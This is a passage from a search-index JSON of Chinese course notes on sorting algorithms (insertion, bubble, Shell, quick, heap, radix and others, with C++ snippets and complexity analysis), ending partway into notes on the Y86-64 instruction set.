\u200b\u76f8\u5bf9\u200b\u4f4d\u7f6e\u200b\u4e0d\u4f1a\u200b\u6539\u53d8\u200b</p> <p>\u200b\u7a7a\u95f4\u200b\u4ee3\u4ef7\u200b: \\(O(1)\\) </p> <p>\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b:</p> <ul> <li>\u200b\u6700\u4f73\u200b\u60c5\u51b5\u200b: \u200b\u6b63\u5e8f\u200b, \\(n-1\\) \u200b\u6b21\u200b\u6bd4\u8f83\u200b, \\(0\\) \u200b\u6b21\u200b\u4ea4\u6362\u200b, \u200b\u590d\u6742\u5ea6\u200b \\(\\Theta(n)\\)</li> <li>\u200b\u6700\u574f\u200b\u60c5\u51b5\u200b: \u200b\u9006\u5e8f\u200b, \u200b\u6bd4\u8f83\u200b\u548c\u200b\u4ea4\u6362\u200b\u6b21\u6570\u200b\u4e3a\u200b \\(n(n-1)/2\\)</li> <li>\u200b\u5e73\u5747\u200b\u60c5\u51b5\u200b: \\(O(n^2)\\)</li> </ul> <p>\u200b\u4f18\u5316\u200b\u7684\u200b\u63d2\u5165\u6392\u5e8f\u200b: \u200b\u4e0d\u7528\u200b\u6bcf\u6b21\u200b\u6bd4\u8f83\u200b\u90fd\u200b\u4ea4\u6362\u200b, \u200b\u4fdd\u5b58\u200b\u6700\u540e\u200b\u8981\u200b\u4ea4\u6362\u200b\u7684\u200b\u4f4d\u7f6e\u200b.</p> <p>\u200b\u57fa\u4e8e\u200b\u4e8c\u5206\u200b\u67e5\u627e\u200b\u7684\u200b\u63d2\u5165\u6392\u5e8f\u200b: \u200b\u5229\u7528\u200b\u597d\u200b\u5df2\u200b\u63d2\u5165\u200b\u7684\u200b\u96c6\u5408\u200b\u7684\u200b\u6709\u5e8f\u6027\u200b, \u200b\u6bd4\u8f83\u200b\u6b21\u6570\u200b\u964d\u200b\u4e3a\u200b \\(O(n\\log n)\\), \u200b\u79fb\u52a8\u200b\u6b21\u6570\u200b\u4ecd\u4e3a\u200b \\(n^2\\) \u200b\u7ea7\u522b\u200b. \u200b\u6700\u4f73\u200b\u60c5\u51b5\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b: \\(\\Theta(n\\log n)\\), \u200b\u6700\u5dee\u200b\u548c\u200b\u5e73\u5747\u200b\u60c5\u51b5\u200b \\(\\Theta(n^2)\\)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#822","title":"8.2.2 \u200b\u5192\u6ce1\u6392\u5e8f","text":"<p>\u200b\u7b97\u6cd5\u200b: \u200b\u4e0d\u505c\u200b\u6bd4\u8f83\u200b\u76f8\u90bb\u200b\u8bb0\u5f55\u200b, \u200b\u5982\u679c\u200b\u4e0d\u200b\u6ee1\u8db3\u200b\u5c31\u200b\u4ea4\u6362\u200b\u76f8\u90bb\u200b\u8bb0\u5f55\u200b, \u200b\u76f4\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u8bb0\u5f55\u200b\u90fd\u200b\u5df2\u6392\u200b\u597d\u5e8f\u200b. \u200b\u6700\u5927\u503c\u200b(\u200b\u6700\u5c0f\u503c\u200b)\u200b\u5c31\u200b\u597d\u50cf\u200b\u5192\u200b\u6c14\u6ce1\u200b\u4e00\u6837\u200b\u4e00\u6b65\u6b65\u200b\u6765\u5230\u200b\u5e8f\u5217\u200b\u6700\u540e\u200b(\u200b\u6700\u200b\u524d\u200b)</p> <p>\u200b\u4ee3\u7801\u200b:</p> C++<pre><code>for (int i = 1; i &lt; n; i++) // \u200b\u5411\u524d\u200b\u5192\u6ce1\u200b\n    for (int j = n - 1; j &gt;= i; j--) \n        if (Array[j] &lt; Array[j-1]) swap(Array, j, j-1);\n</code></pre> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u7a33\u5b9a\u200b\u7684\u200b</p> <p>\u200b\u7a7a\u95f4\u200b\u4ee3\u4ef7\u200b: \\(O(1)\\)</p> <p>\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b: \u200b\u6bd4\u8f83\u200b\u6b21\u6570\u200b \\(n(n-1)/2\\), \u200b\u4ea4\u6362\u200b\u6b21\u6570\u200b\u6700\u591a\u4e3a\u200b \\(\\Theta(n^2)\\), \u200b\u6700\u5c0f\u200b\u4e3a\u200b \\(0\\), \u200b\u6700\u5927\u200b, \u200b\u6700\u5c0f\u200b,\u200b\u5e73\u5747\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b\u5747\u200b\u4e3a\u200b \\(\\Theta(n^2)\\)</p> <p>\u200b\u4f18\u5316\u200b\u7684\u200b\u5192\u6ce1\u6392\u5e8f\u200b: \u200b\u5982\u679c\u200b\u4e00\u6b21\u200b\u5192\u6ce1\u200b\u8fc7\u7a0b\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u4ea4\u6362\u200b\u76f4\u63a5\u200b\u505c\u6b62\u200b, \u200b\u6700\u5c0f\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b\u4e3a\u200b \\(\\Theta(n)\\)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#823","title":"8.2.3 \u200b\u76f4\u63a5\u200b\u9009\u62e9\u200b\u6392\u5e8f","text":"<p>\u200b\u7b97\u6cd5\u200b: \u200b\u6bcf\u200b\u4e00\u8d9f\u200b\u4ece\u200b\u540e\u9762\u200b \\(n-i\\) \u200b\u4e2a\u5f85\u6392\u200b\u8bb0\u5f55\u200b\u7684\u200b\u6700\u5c0f\u503c\u200b\u548c\u200b\u7b2c\u200b \\(i\\) \u200b\u4e2a\u200b\u8bb0\u5f55\u200b\u4ea4\u6362\u200b</p> <p>\u200b\u4ee3\u7801\u200b:</p> C++<pre><code>for (int i = 0; i &lt; n-1; i++) {\n    int smallest = i;\n    for (int j = i+1; j &lt; n; j++) {\n        if (Array[j] &lt; Array[smallest]) \n            smallest = j;\n    }\n    swap(Array, i, smallest);\n}\n</code></pre> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u4e0d\u200b\u7a33\u5b9a\u200b\u7684\u200b, \u200b\u7531\u4e8e\u200b\u76f4\u63a5\u200b\u9009\u62e9\u200b\u6392\u5e8f\u200b\u6bcf\u6b21\u200b\u662f\u200b\u76f4\u63a5\u200b\u548c\u200b\u540e\u9762\u200b\u7684\u200b\u6700\u5c0f\u503c\u200b\u4ea4\u6362\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u80fd\u200b\u628a\u200b\u76f8\u5bf9\u200b\u4f4d\u7f6e\u200b\u5728\u200b\u524d\u9762\u200b\u7684\u200b\u8bb0\u5f55\u200b\u6362\u200b\u5230\u200b\u540e\u9762\u200b.</p> <p>\u200b\u6700\u5dee\u200b\u6700\u597d\u200b\u5e73\u5747\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b\u4e0e\u200b\u6bd4\u8f83\u200b\u6b21\u6570\u200b\u5747\u200b\u4e3a\u200b \\(\\Theta(n^2)\\)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#83-shell","title":"8.3 Shell \u200b\u6392\u5e8f","text":"<p>Shell \u200b\u6392\u5e8f\u200b\u57fa\u4e8e\u200b\u76f4\u63a5\u200b\u63d2\u5165\u6392\u5e8f\u200b\u7684\u200b 2 \u200b\u4e2a\u200b\u6027\u8d28\u200b</p> <ul> <li>\u200b\u5f85\u200b\u6392\u5e8f\u200b\u5e8f\u5217\u200b\u8f83\u200b\u77ed\u200b\u60c5\u5f62\u200b\u4e0b\u200b\u6548\u7387\u9ad8\u200b</li> <li>\u200b\u6574\u4f53\u200b\u6709\u5e8f\u200b\u7684\u200b\u60c5\u5f62\u200b\u4e0b\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b\u4f4e\u200b</li> </ul> <p></p> <p></p> <p>\u200b\u4ee3\u7801\u200b: C++<pre><code>for (int delta = n / 2; delta; delta /= 2)\n  for (int j = 0; j &lt; delta; j++)\n    ModifiedInsertSort(&amp;Array[j], n-j, delta);\n\nvoid ModifiedInsertSort(...) {\n    for (int i = delta; i &lt; n; i += delta)\n      for (int j = i; j &gt;= delta; j -= delta) {\n          if (Array[j] &lt; Array[j-delta])\n            swap();\n          else\n            break;\n      }\n}\n</code></pre></p> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u5212\u5206\u200b\u4e3a\u5b50\u200b\u5e8f\u5217\u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u80fd\u200b\u628a\u200b\u76f8\u5bf9\u200b\u4f4d\u7f6e\u200b\u9760\u200b\u524d\u200b\u7684\u200b\u8bb0\u5f55\u200b\u4ea4\u6362\u200b\u5230\u200b\u540e\u9762\u200b, \u200b\u56e0\u6b64\u200b\u662f\u200b\u4e0d\u200b\u7a33\u5b9a\u200b\u7684\u200b.</p> <p></p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#84","title":"8.4 \u200b\u57fa\u4e8e\u200b\u5206\u6cbb\u200b\u7684\u200b\u6392\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#841","title":"8.4.1 \u200b\u5feb\u901f\u200b\u6392\u5e8f","text":"<p>\u200b\u8f74\u503c\u200b\u9009\u62e9\u200b\u8981\u200b\u5c3d\u53ef\u80fd\u200b\u8ba9\u200b \\(L\\) \u200b\u548c\u200b \\(R\\) \u200b\u957f\u5ea6\u200b\u76f8\u7b49\u200b, \u200b\u53ef\u4ee5\u200b\u56fa\u5b9a\u200b\u4f4d\u7f6e\u200b, \u200b\u4e2d\u200b\u503c\u200b\u8ba1\u7b97\u200b, \u200b\u968f\u673a\u200b\u9009\u62e9\u200b.</p> <p>\u200b\u5e8f\u5217\u200b\u5212\u5206\u200b: </p> <p>\u200b\u9009\u62e9\u200b\u9996\u200b\u5143\u7d20\u200b\u4e3a\u8f74\u503c\u200b. \u200b\u7528\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\u4e0d\u65ad\u200b\u5c06\u200b\u5927\u4e8e\u200b pivot \u200b\u7684\u200b\u653e\u5230\u200b\u540e\u9762\u200b, \u200b\u5c0f\u4e8e\u200b pivot \u200b\u7684\u200b\u653e\u5230\u200b\u524d\u9762\u200b. </p> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u5212\u5206\u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u80fd\u200b\u628a\u200b\u76f8\u5bf9\u200b\u4f4d\u7f6e\u200b\u9760\u200b\u524d\u200b\u7684\u200b\u8bb0\u5f55\u200b\u653e\u5230\u200b\u540e\u9762\u200b, \u200b\u56e0\u6b64\u200b\u662f\u200b\u4e0d\u200b\u7a33\u5b9a\u200b\u7684\u200b.</p> <p>\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b: \u200b\u6700\u4f73\u200b: \\(O(n\\log n)\\) (\u200b\u6bcf\u6b21\u200b\u5747\u5300\u200b\u5212\u5206\u200b) \u200b\u6700\u5dee\u200b \\(O(n^2)\\) (\u200b\u6bcf\u6b21\u200b\u5212\u5206\u200b\u4e3a\u200b 1 \u200b\u4e2a\u200b\u548c\u200b\u5269\u4f59\u200b\u7684\u200b)</p> <p>\u200b\u5e73\u5747\u200b\u6027\u80fd\u200b:</p> <p>\u200b\u5047\u8bbe\u200b \\(\\text{pivot}\\) \u200b\u7684\u200b\u9009\u53d6\u200b\u662f\u200b\u968f\u673a\u200b\u7684\u200b</p> <p>$$ \\begin{align} T(n)&amp;=\\frac{1}{n}\\sum_{i=0}^{n-1}(T(i)+T(n-i-1))+cn \\     &amp;=\\frac{2}{n}\\sum_{i=0}^{n-1}T(i)+cn\\ nT(n)&amp;=2\\sum_{i=0}<sup>{n-1}T(i)+cn</sup>2\\ nT(n)&amp;-(n-1)T(n-1)=2T(n-1)+2cn-c\\ nT(n)&amp;=(n+1)T(n-1)+2cn\\ \\frac{T(n)}{n+1}&amp;=\\frac{T(n-1)}{n}+\\frac{2c}{n+1}\\ \\frac{T(n)}{n+1}&amp;=2c(\\frac{1}{n+1}+\\frac{1}{n}+...+\\frac{1}{3})=2c\\log(n)\\ T(n)&amp;=O(n\\log n) \\end{align}</p> <p>$$</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#842","title":"8.4.2 \u200b\u5f52\u5e76\u200b\u6392\u5e8f","text":"<p>\u200b\u7a33\u5b9a\u200b\u7684\u200b \\(O(n\\log n)\\) \u200b\u7b97\u6cd5\u200b. \u200b\u5b58\u50a8\u200b\u5f00\u9500\u200b\u8f83\u5927\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#85","title":"8.5 \u200b\u5806\u6392\u5e8f","text":"<p>\u200b\u5bf9\u200b\u6240\u6709\u200b\u8bb0\u5f55\u200b\u5efa\u7acb\u200b\u6700\u5927\u200b\u5806\u200b \\(O(n)\\)</p> <p>\u200b\u53d6\u51fa\u200b\u5806\u9876\u200b\u8bb0\u5f55\u200b\u4e0e\u200b\u6570\u7ec4\u200b\u672b\u7aef\u200b\u4ea4\u6362\u200b, \u200b\u91cd\u65b0\u200b\u8c03\u6574\u200b\u5806\u200b.</p> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u7c7b\u4f3c\u200b\u76f4\u63a5\u200b\u9009\u62e9\u200b\u6392\u5e8f\u200b, \u200b\u6bcf\u6b21\u200b\u5c06\u200b\u6700\u5927\u503c\u200b\u4e0e\u200b\u672b\u5c3e\u200b\u4ea4\u6362\u200b, \u200b\u7a33\u5b9a\u6027\u200b\u65e0\u6cd5\u200b\u4fdd\u8bc1\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#86","title":"8.6 \u200b\u5206\u914d\u200b\u6392\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#861","title":"8.6.1 \u200b\u6876\u200b\u6392\u5e8f","text":"<p>\u200b\u5c06\u200b\u8bb0\u5f55\u200b\u7684\u200b\u6392\u5e8f\u200b\u5b57\u5b58\u200b\u5230\u200b\u6876\u200b\u91cc\u200b, \u200b\u8bb0\u5f55\u200b <code>count[i]=count[i-1]+count[i]</code> \u200b\u8868\u793a\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b i \u200b\u7684\u200b\u8bb0\u5f55\u200b\u6570\u91cf\u200b, \u200b\u6536\u96c6\u200b\u4ece\u540e\u200b\u5f80\u524d\u200b\u4fdd\u6301\u200b\u7a33\u5b9a\u6027\u200b.</p> <p>\u200b\u7a7a\u95f4\u200b\u4e0e\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b: \u200b\u5747\u200b\u4e3a\u200b \\(\\Theta(m+n)\\) </p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#862","title":"8.6.2 \u200b\u57fa\u6570\u6392\u5e8f","text":"<p>\u200b\u5c06\u200b\u6392\u5e8f\u200b\u7801\u200b\u5206\u4e3a\u200b \\(d\\) \u200b\u4f4d\u5b50\u200b\u6392\u5e8f\u200b\u7801\u200b, \u200b\u5b50\u200b\u6392\u5e8f\u200b\u7801\u200b\u7684\u200b\u53d6\u503c\u200b\u8303\u56f4\u200b\u79f0\u4e3a\u200b\u57fa\u6570\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(r\\)</p> <p>\u200b\u4f8b\u5982\u200b, \u200b\u4e00\u822c\u200b\u7684\u200b\u6574\u6570\u200b\u6392\u5e8f\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u5341\u8fdb\u5236\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4f4d\u200b\u4e3a\u5b50\u200b\u6392\u5e8f\u200b\u7801\u200b, \u200b\u57fa\u6570\u200b\u4e3a\u200b \\(10\\)</p> <p>\u200b\u9ad8\u4f4d\u200b\u4f18\u5148\u200b\u6cd5\u200b: \u200b\u5148\u200b\u6309\u200b\u6700\u9ad8\u200b\u4f4d\u6876\u200b\u6392\u5e8f\u200b, \u200b\u518d\u200b\u6309\u6b21\u200b\u9ad8\u4f4d\u200b... </p> <p>\u200b\u4f4e\u4f4d\u200b\u4f18\u5148\u200b\u6cd5\u200b: \u200b\u4ece\u200b\u6700\u4f4e\u200b\u4f4d\u5f80\u200b\u4e0a\u200b\u6392\u5e8f\u200b. </p> <p>\u200b\u7a7a\u95f4\u200b\u4ee3\u4ef7\u200b: \\(\\Theta(n+r)\\) \u200b\u4e34\u65f6\u200b\u6570\u7ec4\u200b + \\(r\\) \u200b\u4e2a\u200b\u8ba1\u6570\u5668\u200b</p> <p>\u200b\u65f6\u95f4\u200b\u4ee3\u4ef7\u200b: \\(\\Theta(d\\cdot (n+r))\\)</p> <p>\u200b\u57fa\u4e8e\u200b\u9759\u6001\u200b\u94fe\u200b\u7684\u200b\u57fa\u6570\u6392\u5e8f\u200b: </p> <p></p> <p>\u200b\u5229\u7528\u200b\u94fe\u8868\u200b\u628a\u200b\u51e0\u4e2a\u200b\u6876\u200b\u8fde\u200b\u8d77\u6765\u200b, \u200b\u5728\u200b\u6392\u5e8f\u200b\u7684\u200b\u65f6\u5019\u200b\u907f\u514d\u200b\u5927\u91cf\u200b\u590d\u5236\u200b\u64cd\u4f5c\u200b </p> <p>\u200b\u5206\u200b: \u200b\u5c06\u200b\u6240\u6709\u200b\u6876\u200b\u5934\u200b\u6307\u9488\u200b\u6e05\u7a7a\u200b, \u200b\u904d\u5386\u200b Array \u200b\u5c06\u200b\u5143\u7d20\u200b\u52a0\u5165\u200b\u6bcf\u4e2a\u200b\u6876\u200b\u7684\u200b\u94fe\u8868\u200b\u5c3e\u90e8\u200b.</p> <p>\u200b\u5408\u200b: \u200b\u5148\u200b\u627e\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u975e\u7a7a\u200b\u7684\u200b\u6876\u200b\u628a\u200b Array \u200b\u7684\u200b\u8d77\u59cb\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u8be5\u200b\u6876\u200b\u7684\u200b\u5934\u200b, \u200b\u6b64\u65f6\u200b\u7ed3\u5c3e\u200b\u5c31\u662f\u200b\u8be5\u6876\u200b\u7684\u200b\u5c3e\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u7ee7\u7eed\u200b\u627e\u200b\u975e\u7a7a\u200b\u7684\u200b\u6876\u200b, \u200b\u628a\u200b Array \u200b\u7ed3\u5c3e\u200b\u7684\u200b next \u200b\u6307\u9488\u200b\u6307\u5411\u200b\u6876\u200b\u7684\u200b\u5934\u200b, \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u4e0d\u540c\u200b\u7684\u200b\u6876\u200b\u4e32\u8054\u200b\u8d77\u6765\u200b.</p> <p></p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#863","title":"8.6.3 \u200b\u7d22\u5f15\u200b\u6392\u5e8f","text":"<p>\u200b\u79fb\u52a8\u200b\u8bb0\u5f55\u200b\u65f6\u200b\u53ea\u200b\u79fb\u52a8\u200b\u7d22\u5f15\u200b, \u200b\u4e0d\u200b\u79fb\u52a8\u200b\u8bb0\u5f55\u200b\u672c\u8eab\u200b, \u200b\u51cf\u5c11\u200b\u8bb0\u5f55\u200b\u79fb\u52a8\u200b\u6b21\u6570\u200b\u5f00\u9500\u200b.</p> <p></p> <p>\u200b\u4e0b\u9762\u200b\u4ee5\u200b Index2 \u200b\u4e3a\u4f8b\u200b.</p> <p>\u200b\u5c06\u200b\u7d22\u5f15\u200b\u770b\u6210\u200b\u4e00\u4e2a\u4e2a\u200b\u73af\u200b </p> \\[ v_{i_0}\\xrightarrow {v_{i_0}=i_1} v_{i_1} \\xrightarrow {v_{i_1}=i_2}... \\xrightarrow {v_{i_{k-1}}=i_k} v_{i_k} \\xrightarrow {v_{i_k}=i_0} v_0 \\] <p>\u200b\u7531\u4e8e\u200b\u7d22\u5f15\u200b\u9700\u8981\u200b\u6ee1\u8db3\u200b:</p> \\[ \\text{SortedArray}[i]=\\text{Array}[v_i] \\] <p>\u200b\u56e0\u6b64\u200b </p> <p>$$ \\begin{align}</p> Text Only<pre><code>\\text{SortedArray}[i_0] &amp;=\\text{Array}[v_{i_0}] \\\\\n\\text{SortedArray}[v_{i_0}] &amp;=\\text{Array}[v_{i_1}] \\\\\n&amp;\\cdots \\\\\n\\text{SortedArray}[v_{i_k}] &amp;=\\text{Array}[i_0] \\\\\n</code></pre> <p>\\end{align} $$</p> <p>\u200b\u5148\u200b\u628a\u200b \\(\\text{Array}[i_0]\\) \u200b\u4fdd\u5b58\u200b\u4e86\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e00\u76f4\u200b\u628a\u200b\u540e\u9762\u200b\u7684\u200b\u503c\u200b\u8d4b\u200b\u7ed9\u200b\u524d\u9762\u200b, \u200b\u6700\u540e\u200b\u628a\u200b\u4fdd\u5b58\u200b\u7684\u200b\u503c\u200b\u8d4b\u200b\u7ed9\u200b\u73af\u4e0a\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#87","title":"8.7 \u200b\u5404\u79cd\u200b\u6392\u5e8f\u200b\u7b97\u6cd5\u200b\u6bd4\u8f83","text":"<p>\u200b\u4e0d\u200b\u9002\u5408\u200b\u4f7f\u7528\u200b\u94fe\u5f0f\u200b\u5b58\u50a8\u200b\u7684\u200b\u6392\u5e8f\u200b\u7b97\u6cd5\u200b: \u200b\u5373\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u968f\u673a\u200b\u4e0b\u6807\u200b\u8bbf\u95ee\u200b, \u200b\u5982\u200b\u4e0a\u8868\u200b\u4e2d\u200b\u7684\u200b\u4e8c\u5206\u6cd5\u200b\u63d2\u5165\u6392\u5e8f\u200b, Shell \u200b\u6392\u5e8f\u200b, \u200b\u5806\u6392\u5e8f\u200b.</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b, \u200b\u5f52\u5e76\u200b\u6392\u5e8f\u200b\u4f7f\u7528\u200b\u94fe\u8868\u200b\u5b9e\u73b0\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u8f85\u52a9\u200b\u6570\u7ec4\u200b\u7684\u200b\u4f7f\u7528\u200b, \u200b\u964d\u4f4e\u200b\u7a7a\u95f4\u200b\u5f00\u9500\u200b\u548c\u200b\u590d\u5236\u200b\u5f00\u9500\u200b. </p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#88","title":"8.8 \u200b\u6392\u5e8f\u200b\u95ee\u9898\u200b\u7684\u200b\u754c","text":""},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/","title":"Chapter 04 Processor Architecture","text":""},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#41-y86-64","title":"4.1 Y86-64 \u200b\u6307\u4ee4\u96c6\u200b\u4f53\u7cfb\u7ed3\u6784","text":""},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#411","title":"4.1.1 \u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001","text":"<p>\"\u200b\u7a0b\u5e8f\u5458\u200b\" \u200b\u6307\u5199\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u4eba\u200b, \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u662f\u200b\u4ea7\u751f\u200b\u673a\u5668\u200b\u4ee3\u7801\u200b\u7684\u200b\u7f16\u8bd1\u5668\u200b.</p> <ul> <li>15 \u200b\u4e2a\u200b\u7a0b\u5e8f\u200b\u5bc4\u5b58\u5668\u200b: \u200b\u7701\u7565\u200b\u4e86\u200b x86-64 \u200b\u4e2d\u200b\u7684\u200b %r15 (\u200b\u7528\u4f5c\u200b\u65e0\u200b\u5bc4\u5b58\u5668\u200b)</li> <li>3 \u200b\u4e2a\u200b 1 \u200b\u4f4d\u200b\u6761\u4ef6\u200b\u7801\u200b: ZF, SF, OF (\u200b\u6ca1\u6709\u200b CF)</li> <li>PC: \u200b\u5b58\u653e\u200b\u5f53\u524d\u200b\u6b63\u5728\u200b\u6267\u884c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b.</li> <li>\u200b\u5185\u5b58\u200b: \u200b\u62bd\u8c61\u200b\u6210\u200b\u4e00\u4e2a\u200b\u5f88\u5927\u200b\u7684\u200b\u5b57\u8282\u200b\u6570\u7ec4\u200b</li> <li>\u200b\u72b6\u6001\u200b\u7801\u200b stat.</li> </ul>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#412-y86-64","title":"4.1.2 Y86-64 \u200b\u6307\u4ee4","text":"<p>\u200b\u53ea\u200b\u5305\u542b\u200b 8 \u200b\u5b57\u8282\u200b\u6574\u6570\u200b\u64cd\u4f5c\u200b.</p> <p></p> <ul> <li>halt: \u200b\u505c\u673a\u200b\u6307\u4ee4\u200b. \u200b\u4ee3\u7801\u200b 00</li> <li>nop: \u200b\u65e0\u200b\u64cd\u4f5c\u200b. \u200b\u4ee3\u7801\u200b 10</li> <li>mov \u200b\u64cd\u4f5c\u200b<ul> <li>rrmovq: \u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b. icode = 2. \u200b\u7b2c\u4e8c\u4e2a\u200b\u5b57\u8282\u200b\u4e3a\u200b rA|rB \u200b\u6307\u793a\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u5bc4\u5b58\u5668\u200b, \u200b\u56e0\u4e3a\u200b\u4e00\u5171\u200b\u5c31\u200b 15 \u200b\u4e2a\u200b\u5bc4\u5b58\u5668\u200b(\u200b\u52a0\u4e0a\u200b1\u200b\u4e2a\u7a7a\u200b\u5bc4\u5b58\u5668\u200b\u662f\u200b16\u200b\u4e2a\u200b), \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u7528\u200b\u4e00\u4e2a\u200b\u4e00\u4f4d\u200b\u5341\u516d\u8fdb\u5236\u200b\u6570\u200b\u7f16\u7801\u200b, \u200b\u4e24\u4f4d\u200b\u5341\u516d\u8fdb\u5236\u200b\u6570\u200b\u521a\u597d\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b. \u200b\u6839\u636e\u200b ifun \u200b\u8868\u793a\u200b\u4f20\u9001\u200b\u6761\u4ef6\u200b. \u200b\u7279\u522b\u200b\u5730\u200b, ifun=0 \u200b\u8868\u793a\u200b\u65e0\u6761\u4ef6\u200b\u4f20\u9001\u200b</li> <li>irmovq: \u200b\u4ece\u200b\u7acb\u5373\u200b\u6570\u5230\u200b\u5bc4\u5b58\u5668\u200b. icode = 3, ifun = 0. rA=F(\u200b\u7a7a\u200b\u5bc4\u5b58\u5668\u200b), \u200b\u540e\u9762\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b 8 \u200b\u5b57\u8282\u200b\u7acb\u5373\u200b\u6570\u200b V.</li> <li>rmmovq: \u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u5185\u5b58\u200b. icode = 4, ifun = 0. \u200b\u540e\u9762\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u7acb\u5373\u200b\u6570\u200b\u8868\u793a\u200b\u5185\u5b58\u200b\u504f\u79fb\u91cf\u200b. \u200b\u6ce8\u610f\u200b\u65e0\u8bba\u662f\u200b rmmovq \u200b\u8fd8\u662f\u200b mrmovq \u200b\u504f\u79fb\u91cf\u200b\u90fd\u200b\u662f\u200b\u52a0\u200b\u5728\u200b rB \u200b\u4e0a\u200b.</li> <li>mrmovq: \u200b\u4ece\u200b\u5185\u5b58\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b. icode = 5, ifun = 0.</li> </ul> </li> <li>OPq: \u200b\u4e24\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6574\u6570\u200b\u64cd\u4f5c\u200b, \u200b\u7ed3\u679c\u200b\u5b58\u653e\u200b\u5728\u200b rB \u200b\u4e2d\u200b, \u200b\u4f1a\u200b\u8bbe\u7f6e\u200b\u6761\u4ef6\u200b\u7801\u200b. icode=6, \u200b\u6839\u636e\u200b ifun \u200b\u8868\u793a\u200b\u662f\u200b\u54ea\u200b\u4e00\u79cd\u200b\u64cd\u4f5c\u200b</li> <li>jXX: \u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b. icode = 7, \u200b\u6839\u636e\u200b ifun \u200b\u8868\u793a\u200b\u8df3\u8f6c\u200b\u6761\u4ef6\u200b. </li> <li>cmovXX: \u200b\u5c31\u662f\u200b\u4e0a\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b rrmovq \u200b\u7684\u200b ifun != 0 \u200b\u7684\u200b\u65f6\u5019\u200b.</li> <li>call: \u200b\u65e0\u200b\u5bc4\u5b58\u5668\u200b\u6307\u793a\u200b\u7b26\u200b. \u200b\u5c06\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u5165\u6808\u200b, \u200b\u7136\u540e\u200b\u8df3\u8f6c\u200b\u5230\u200b Dest</li> <li>ret: 